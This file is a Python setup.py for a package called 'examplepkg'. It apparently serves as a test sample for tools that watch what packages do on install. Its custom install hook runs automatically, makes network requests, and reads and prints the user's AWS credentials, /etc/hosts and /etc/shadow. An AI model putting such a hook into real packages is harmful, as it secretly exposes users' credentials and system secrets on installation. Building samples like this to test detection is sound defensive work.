import getpass
import os
import pathlib
from urllib.request import urlopen

from setuptools import find_packages, setup
from setuptools.command.install import install


class InstallCommand(install):
    def run(self):
        super().run()
        try:
            urlopen("http://pypi/index").read()
        except Exception:
            pass
        urlopen("https://pypi.org").read()
        with open(pathlib.Path.home() / ".examplepkg", "w+") as f:
            f.write("Hello World!")
        try:
            with open(pathlib.Path.home() / ".aws" / "credentials", "r") as f:
                print(f.read())
        except Exception:
            pass

        if getpass.getuser() == "root":
            print("I am root!")

        os.system("echo 'Hello World!'")

        with open("/etc/hosts", "r") as f:
            print(f.read())

        try:
            with open("/etc/shadow", "r") as f:
                print(f.read())
        except Exception:
            pass


setup(
    name="examplepkg",  # Required
    version="2.0.0",  # Required
    packages=find_packages(),
    python_requires=">=3.7, <4",
    install_requires=["requests", "gunicorn[all]"],
    cmdclass={"install": InstallCommand},
    entry_points={"console_scripts": ["examplepkg=example.console:main"]},
)
